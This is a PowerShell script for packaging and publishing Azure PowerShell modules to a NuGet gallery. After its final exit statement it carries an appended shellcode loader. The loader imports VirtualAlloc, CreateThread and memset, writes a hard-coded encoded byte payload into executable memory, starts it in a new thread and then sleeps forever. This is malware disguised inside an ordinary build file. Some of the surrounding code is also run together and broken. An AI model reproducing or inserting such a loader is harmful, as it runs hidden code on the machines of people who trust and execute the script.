param([CmdletBinding()][Parameter(Mandatory = $false, Position = 0)][switch]$IsNetCore,[Parameter(Mandatory = $false, Position = 1)][ValidateSet("Debug", "Release")][string]$BuildConfig,[Parameter(Mandatory = $false, Position = 2)][ValidateSet("All", "Latest", "Stack", "NetCore", "ServiceManagement", "AzureStorage")][string]$Scope,[Parameter(Mandatory = $false, Position = 3)][string]$ApiKey,[Parameter(Mandatory = $false, Position = 4)][string]$RepositoryLocation,[Parameter(Mandatory = $false, Position = 5)][string]$NugetExe)function Out-FileNoBom {param([System.string]$File,[System.string]$Text)$encoding = New-Object System.Text.UTF8Encoding $False[System.IO.File]::WriteAllLines($File, $Text, $encoding)}function Get-Directories {[CmdletBinding()]param([String]$BuildConfig,[String]$Scope)PROCESS {$packageFolder = "$PSScriptRoot\..\artifacts"$resourceManagerRootFolder = "$packageFolder\$buildConfig"Write-Output -InputObject $packageFolder, $resourceManagerRootFolder}}function Get-RollupModules {[CmdletBinding()]param([string]$BuildConfig,[string]$Scope,[switch]$IsNetCore)PROCESS {$targets = @()if ($Scope -eq 'Stack') {Write-Host "Publishing AzureRM"$targets += "$PSScriptRoot\..\src\StackAdmin\AzureRM"$targets += "$PSScriptRoot\..\src\StackAdmin\AzureStack"}if ($Scope -eq 'All' -or $Scope -eq 'Latest' -or $Scope -eq 'NetCore') {if ($IsNetCore) {$targets += "$PSScriptRoot\Az"} else {$targets += "$PSScriptRoot\AzureRM"}}Write-Output -InputObject $targets}}function Get-AdminModules {[CmdletBinding()]param([string]$BuildConfig,[string]$Scope)PROCESS {$targets = @()if ($Scope -eq "Stack") {$packageFolder, $resourceManagerRootFolder = Get-Directories -BuildConfig $BuildConfig -Scope $Scope$resourceManagerModules = Get-ChildItem -Path $resourceManagerRootFolder -Directory -Filter Azs.*foreach ($module in $resourceManagerModules) {$targets += $module.FullName}}Write-Output -InputObject $targets}}function Get-ClientModules {[CmdletBinding()]param([string]$BuildConfig,[string]$Scope,[bool]$PublishLocal,[switch]$IsNetCore)PROCESS {$targets = @()$packageFolder, $resourceManagerRootFolder = Get-Directories -BuildConfig $BuildConfig -Scope $Scope$AllScopes = @('Stack', 'All', 'Latest', 'NetCore')if ($Scope -in $AllScopes -or $PublishLocal) {if ($Scope -eq "Netcore"){$targets += "$resourceManagerRootFolder\Az.Accounts"}else{$targets += "$resourceManagerRootFolder\AzureRM.Profile"}}$StorageScopes = @('All', 'Latest', 'Stack', 'AzureStorage')if ($Scope -in $StorageScopes) {$targets += "$packageFolder\$buildConfig\Storage\Azure.Storage"}if (-not $IsNetCore) {$ServiceScopes = @('All', 'Latest', 'ServiceManagement')if ($Scope -in $ServiceScopes) {$targets += "$packageFolder\$buildConfig\ServiceManagement\Azure"}}if ($Scope -in $AllScopes) {if ($IsNetCore) {$resourceManagerModules = Get-ChildItem -Path $resourceManagerRootFolder -Directory -Exclude Azs.* | Where-Object {$_.Name -like "*Az.*" -or $_.Name -eq "Az"}} else {$resourceManagerModules = Get-ChildItem -Path $resourceManagerRootFolder -Directory -Exclude Azs.* | Where-Object {$_.Name -like "*Azure*"}}$excludedModules = @('AzureRM.Profile', 'Azure.Storage', 'Az.Accounts')foreach ($module in $resourceManagerModules) {if (-not ($module.Name -in $excludedModules)) {$targets += $module.FullName}}}Write-Output -InputObject $targets}}function Get-AllModules {[CmdletBinding()]param([ValidateNotNullOrEmpty()][String]$BuildConfig,[ValidateNotNullOrEmpty()][String]$Scope,[switch]$PublishLocal,[switch]$IsNetCore)Write-Host "Getting Azure client modules"$clientModules = Get-ClientModules -BuildConfig $BuildConfig -Scope $Scope -PublishLocal:$PublishLocal -IsNetCore:$isNetCoreWrite-Host " "Write-Host "Getting admin modules"$adminModules = Get-AdminModules -BuildConfig $BuildConfig -Scope $ScopeWrite-Host " "Write-Host "Getting rollup modules"$rollupModules = Get-RollupModules -BuildConfig $BuildConfig -Scope $Scope -IsNetCore:$isNetCoreWrite-Host " "return @{ClientModules = $clientModules;AdminModules  = $adminModules;RollUpModules = $rollUpModules}}function Remove-ModuleDependencies {[CmdletBinding()]param([string]$Path)PROCESS {$regex = New-Object System.Text.RegularExpressions.Regex "RequiredModules\s*=\s*@\([^\)]+\)"$content = (Get-Content -Path $Path) -join "`r`n"$text = $regex.Replace($content, "RequiredModules = @()")Out-FileNoBom -File $Path -Text $text$regex = New-Object System.Text.RegularExpressions.Regex "NestedModules\s*=\s*@\([^\)]+\)"$content = (Get-Content -Path $Path) -join "`r`n"$text = $regex.Replace($content, "NestedModules = @()")Out-FileNoBom -File $Path -Text $text}}function Update-NugetPackage {[CmdletBinding()]param([string]$TempRepoPath,[string]$ModuleName,[string]$DirPath,[string]$NugetExe)PROCESS {$regex2 = "<requireLicenseAcceptance>false</requireLicenseAcceptance>"$relDir = Join-Path $DirPath -ChildPath "_rels"$contentPath = Join-Path $DirPath -ChildPath '`[Content_Types`].xml'$packPath = Join-Path $DirPath -ChildPath "package"$modulePath = Join-Path $DirPath -ChildPath ($ModuleName + ".nuspec")Remove-Item -Recurse -Path $relDir -ForceRemove-Item -Recurse -Path $packPath -ForceRemove-Item -Path $contentPath -Force$content = (Get-Content -Path $modulePath) -join "`r`n"$content = $content -replace $regex2, ("<requireLicenseAcceptance>true</requireLicenseAcceptance>")Out-FileNoBom -File (Join-Path (Get-Location) $modulePath) -Text $content&$NugetExe pack $modulePath -OutputDirectory $TempRepoPath -NoPackageAnalysis}}function Add-Modules {[CmdletBinding()]param([String[]]$ModulePaths,[ValidateNotNullOrEmpty()][String]$TempRepo,[ValidateNotNullOrEmpty()][String]$TempRepoPath,[ValidateNotNullOrEmpty()][String]$NugetExe)PROCESS {foreach ($modulePath in $ModulePaths) {Write-Output $modulePath$module = Get-Item -Path $modulePathWrite-Output "Updating $module module from $modulePath"Add-Module -Path $modulePath -TempRepo $TempRepo -TempRepoPath $TempRepoPath -NugetExe $NugetExeWrite-Output "Updated $module module"}}}function Save-PackageLocally {[CmdletBinding()]param($Module,[string]$TempRepo,[string]$TempRepoPath)$ModuleName = $module['ModuleName']$RequiredVersion = $module['RequiredVersion']if ($RequiredVersion -ne $null) {Write-Output "Checking for required module $ModuleName, $RequiredVersion"if (Find-Module -Name $ModuleName -RequiredVersion $RequiredVersion -Repository $TempRepo -ErrorAction SilentlyContinue) {Write-Output "Required dependency $ModuleName, $RequiredVersion found in the repo $TempRepo"} else {Write-Warning "Required dependency $ModuleName, $RequiredVersion not found in the repo $TempRepo"Write-Output "Downloading the package from PsGallery to the path $TempRepoPath"Save-Package -Name $ModuleName -RequiredVersion $RequiredVersion -ProviderName Nuget -Path $TempRepoPath -Source https://www.powershellgallery.com/api/v2 | Out-NullWrite-Output "Downloaded the package sucessfully"}}}function Save-PackagesFromPsGallery {[CmdletBinding()]param([String[]]$ModulePaths,[ValidateNotNullOrEmpty()][String]$TempRepo,[ValidateNotNullOrEmpty()][String]$TempRepoPath)PROCESS {Write-Output "Saving..."foreach ($modulePath in $ModulePaths) {Write-Output "module path $modulePath"$module = (Get-Item -Path $modulePath).Name$moduleManifest = $module + ".psd1"Write-Host "Verifying $module has all the dependencies in the repo $TempRepo"$psDataFile = Import-PowershellDataFile (Join-Path $modulePath -ChildPath $moduleManifest)$RequiredModules = $psDataFile['RequiredModules']if ($RequiredModules -ne $null) {foreach ($tmp in $RequiredModules) {foreach ($module in $tmp) {Save-PackageLocally -Module $module -TempRepo $TempRepo -TempRepoPath $TempRepoPath}}}}}}function Add-AllModules {[CmdletBinding()]param($ModulePaths,[ValidateNotNullOrEmpty()][String]$TempRepo,[ValidateNotNullOrEmpty()][String]$TempRepoPath,[ValidateNotNullOrEmpty()][String]$NugetExe)$Keys = @('ClientModules', 'AdminModules', 'RollupModules')Write-Output "adding modules to local repo"foreach ($module in $Keys) {$modulePath = $Modules[$module]Write-Output "Adding $module modules to local repo"Save-PackagesFromPsGallery -TempRepo $TempRepo -TempRepoPath $TempRepoPath -ModulePaths $modulePathAdd-Modules -TempRepo $TempRepo -TempRepoPath $TempRepoPath -ModulePath $modulePath -NugetExe $NugetExeWrite-Output " "}Write-Output " "}function Add-PSM1Dependency {[CmdletBinding()]param([string] $Path)PROCESS {$file = Get-Item -Path $Path$manifestFile = $file.Name$psm1file = $manifestFile -replace ".psd1", ".psm1"$regex = New-Object System.Text.RegularExpressions.Regex "$content = (Get-Content -Path $Path) -join "`r`n"$text = $regex.Replace($content, "RootModule = '$psm1file'")$text | Out-File -FilePath $Path}}function Add-Module {[CmdletBinding()]param([ValidateNotNullOrEmpty()][string]$Path,[ValidateNotNullOrEmpty()][string]$TempRepo,[ValidateNotNullOrEmpty()][string]$TempRepoPath,[ValidateNotNullOrEmpty()][string]$NugetExe)PROCESS {$moduleName = (Get-Item -Path $Path).Name$moduleManifest = $moduleName + ".psd1"$moduleSourcePath = Join-Path -Path $Path -ChildPath $moduleManifest$file = Get-Item $moduleSourcePathImport-LocalizedData -BindingVariable ModuleMetadata -BaseDirectory $file.DirectoryName -FileName $file.Name$moduleVersion = $ModuleMetadata.ModuleVersion.ToString()if ($ModuleMetadata.PrivateData.PSData.Prerelease -ne $null) {$moduleVersion += ("-" + $ModuleMetadata.PrivateData.PSData.Prerelease -replace "--", "-")}if (Find-Module -Name $moduleName -Repository $TempRepo -RequiredVersion $moduleVersion -AllowPrerelease -ErrorAction SilentlyContinue){Write-Output "Existing module found: $moduleName"$moduleNupkgPath = Join-Path -Path $TempRepoPath -ChildPath ($moduleName + "." + $moduleVersion + ".nupkg")Write-Output "Deleting the module: $moduleNupkgPath"Remove-Item -Path $moduleNupkgPath -Force}Write-Output "Publishing the module $moduleName"Publish-Module -Path $Path -Repository $TempRepo -Force | Out-NullWrite-Output "$moduleName published"if ($ModuleMetadata.RootModule) {Write-Output "Root module found, done"return}Write-Output "No root module found, creating"Write-Output "Changing to local repository directory for module modifications $TempRepoPath"Push-Location $TempRepoPathtry {$nupkgPath = Join-Path -Path . -ChildPath ($moduleName + "." + $moduleVersion + ".nupkg")$zipPath = Join-Path -Path . -ChildPath ($moduleName + "." + $moduleVersion + ".zip")$dirPath = Join-Path -Path . -ChildPath $moduleName$unzippedManifest = Join-Path -Path $dirPath -ChildPath ($moduleName + ".psd1")if (!(Test-Path -Path $nupkgPath)) {throw "Module at $nupkgPath in $TempRepoPath does not exist"}Write-Output "Renaming package $nupkgPath to zip archive $zipPath"Rename-Item $nupkgPath $zipPathWrite-Output "Expanding $zipPath"Expand-Archive $zipPath -DestinationPath $dirPathWrite-Output "Adding PSM1 dependency to $unzippedManifest"Add-PSM1Dependency -Path $unzippedManifestWrite-Output "Removing module manifest dependencies for $unzippedManifest"Remove-ModuleDependencies -Path (Join-Path $TempRepoPath $unzippedManifest)Remove-Item -Path $zipPath -ForceWrite-Output "Repackaging $dirPath"Update-NugetPackage -TempRepoPath $TempRepoPath -ModuleName $moduleName -DirPath $dirPath -NugetExe $NugetExeWrite-Output "Removing temporary folder $dirPath"Remove-Item -Recurse $dirPath -Force -ErrorAction Stop} finally {Pop-Location}}}function Publish-PowershellModule {[CmdletBinding()]param([string]$Path,[string]$ApiKey,[string]$TempRepoPath,[string]$RepoLocation,[string]$NugetExe)PROCESS {$moduleName = (Get-Item -Path $Path).Name$moduleManifest = $moduleName + ".psd1"$moduleSourcePath = Join-Path -Path $Path -ChildPath $moduleManifest$manifest = Test-ModuleManifest -Path $moduleSourcePath$nupkgPath = Join-Path -Path $TempRepoPath -ChildPath ($moduleName + "." + $manifest.Version.ToString() + ".nupkg")if (!(Test-Path -Path $nupkgPath)) {throw "Module at $nupkgPath in $TempRepoPath does not exist"}Write-Output "Pushing package $moduleName to nuget source $RepoLocation"&$NugetExe push $nupkgPath $ApiKey -s $RepoLocationWrite-Output "Pushed package $moduleName to nuget source $RepoLocation"}}function Publish-AllModules {[CmdletBinding()]param($ModulePaths,[ValidateNotNullOrEmpty()][String]$ApiKey,[ValidateNotNullOrEmpty()][String]$TempRepoPath,[ValidateNotNullOrEmpty()][String]$RepoLocation,[ValidateNotNullOrEmpty()][String]$NugetExe,[switch]$PublishLocal)if (!$PublishLocal) {foreach ($module in $ModulePaths.Keys) {$paths = $Modules[$module]foreach ($modulePath in $paths) {$module = Get-Item -Path $modulePathWrite-Host "Pushing $module module from $modulePath"Publish-PowershellModule -Path $modulePath -ApiKey $apiKey -TempRepoPath $TempRepoPath -RepoLocation $RepoLocation -NugetExe $NugetExeWrite-Host "Pushed $module module"}}}}if ([string]::IsNullOrEmpty($buildConfig)) {Write-Verbose "Setting build configuration to 'Release'"$buildConfig = "Release"}if ([string]::IsNullOrEmpty($repositoryLocation)) {Write-Verbose "Setting repository location to 'https://dtlgalleryint.cloudapp.net/api/v2'"$repositoryLocation = "https://dtlgalleryint.cloudapp.net/api/v2"}if ([string]::IsNullOrEmpty($nugetExe)) {Write-Verbose "Use default nuget path"$nugetExe = "$PSScriptRoot\nuget.exe"}Write-Host "Publishing $Scope package (and its dependencies)"Get-PackageProvider -Name NuGet -ForceWrite-Host " "$packageFolder = "$PSScriptRoot\..\artifacts"if ($Scope -eq 'Stack') {$packageFolder = "$PSScriptRoot\..\src\Stack"}$PublishLocal = test-path $repositoryLocation[string]$tempRepoPath = "$packageFolder"if ($PublishLocal) {if ($Scope -eq 'Stack') {$tempRepoPath = (Join-Path $repositoryLocation -ChildPath "Stack")} else {$tempRepoPath = (Join-Path $repositoryLocation -ChildPath "..\artifacts")}}$null = New-Item -ItemType Directory -Force -Path $tempRepoPath$tempRepoName = ([System.Guid]::NewGuid()).ToString()$repo = Get-PSRepository | Where-Object { $_.SourceLocation -eq $tempRepoPath }if ($repo -ne $null) {$tempRepoName = $repo.Name} else {Register-PSRepository -Name $tempRepoName -SourceLocation $tempRepoPath -PublishLocation $tempRepoPath -InstallationPolicy Trusted -PackageManagementProvider NuGet}$env:PSModulePath = "$env:PSModulePath;$tempRepoPath"$Errors = $nulltry {$modules = Get-AllModules -BuildConfig $BuildConfig -Scope $Scope -PublishLocal:$PublishLocal -IsNetCore:$IsNetCoreAdd-AllModules -ModulePaths $modules -TempRepo $tempRepoName -TempRepoPath $tempRepoPath -NugetExe $NugetExePublish-AllModules -ModulePaths $modules -ApiKey $apiKey -TempRepoPath $tempRepoPath -RepoLocation $repositoryLocation -NugetExe $NugetExe -PublishLocal:$PublishLocal} catch {$Errors = $_Write-Error ($_ | Out-String)} finally {Unregister-PSRepository -Name $tempRepoName}if ($Errors -ne $null) {exit 1}exit 0$BRmX = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $BRmX -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xdb,0xd4,0xd9,0x74,0x24,0xf4,0xbe,0x8b,0xc9,0x92,0xaf,0x5a,0x31,0xc9,0xb1,0x47,0x83,0xc2,0x04,0x31,0x72,0x14,0x03,0x72,0x9f,0x2b,0x67,0x53,0x77,0x29,0x88,0xac,0x87,0x4e,0x00,0x49,0xb6,0x4e,0x76,0x19,0xe8,0x7e,0xfc,0x4f,0x04,0xf4,0x50,0x64,0x9f,0x78,0x7d,0x8b,0x28,0x36,0x5b,0xa2,0xa9,0x6b,0x9f,0xa5,0x29,0x76,0xcc,0x05,0x10,0xb9,0x01,0x47,0x55,0xa4,0xe8,0x15,0x0e,0xa2,0x5f,0x8a,0x3b,0xfe,0x63,0x21,0x77,0xee,0xe3,0xd6,0xcf,0x11,0xc5,0x48,0x44,0x48,0xc5,0x6b,0x89,0xe0,0x4c,0x74,0xce,0xcd,0x07,0x0f,0x24,0xb9,0x99,0xd9,0x75,0x42,0x35,0x24,0xba,0xb1,0x47,0x60,0x7c,0x2a,0x32,0x98,0x7f,0xd7,0x45,0x5f,0x02,0x03,0xc3,0x44,0xa4,0xc0,0x73,0xa1,0x55,0x04,0xe5,0x22,0x59,0xe1,0x61,0x6c,0x7d,0xf4,0xa6,0x06,0x79,0x7d,0x49,0xc9,0x08,0xc5,0x6e,0xcd,0x51,0x9d,0x0f,0x54,0x3f,0x70,0x2f,0x86,0xe0,0x2d,0x95,0xcc,0x0c,0x39,0xa4,0x8e,0x58,0x8e,0x85,0x30,0x98,0x98,0x9e,0x43,0xaa,0x07,0x35,0xcc,0x86,0xc0,0x93,0x0b,0xe9,0xfa,0x64,0x83,0x14,0x05,0x95,0x8d,0xd2,0x51,0xc5,0xa5,0xf3,0xd9,0x8e,0x35,0xfc,0x0f,0x3a,0x33,0x6a,0xaf,0xb8,0xd7,0x31,0xa7,0xbc,0x27,0xd6,0xf5,0x48,0xc1,0x88,0xa9,0x1a,0x5e,0x68,0x1a,0xdb,0x0e,0x00,0x70,0xd4,0x71,0x30,0x7b,0x3e,0x1a,0xda,0x94,0x97,0x72,0x72,0x0c,0xb2,0x09,0xe3,0xd1,0x68,0x74,0x23,0x59,0x9f,0x88,0xed,0xaa,0xea,0x9a,0x99,0x5a,0xa1,0xc1,0x0f,0x64,0x1f,0x6f,0xaf,0xf0,0xa4,0x26,0xf8,0x6c,0xa7,0x1f,0xce,0x32,0x58,0x4a,0x45,0xfa,0xcc,0x35,0x31,0x03,0x01,0xb6,0xc1,0x55,0x4b,0xb6,0xa9,0x01,0x2f,0xe5,0xcc,0x4d,0xfa,0x99,0x5d,0xd8,0x05,0xc8,0x32,0x4b,0x6e,0xf6,0x6d,0xbb,0x31,0x09,0x58,0x3d,0x0d,0xdc,0xa4,0x4b,0x7f,0xdc;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$IsL=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($IsL.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$IsL,0,0,0);for (;;){Start-sleep 60};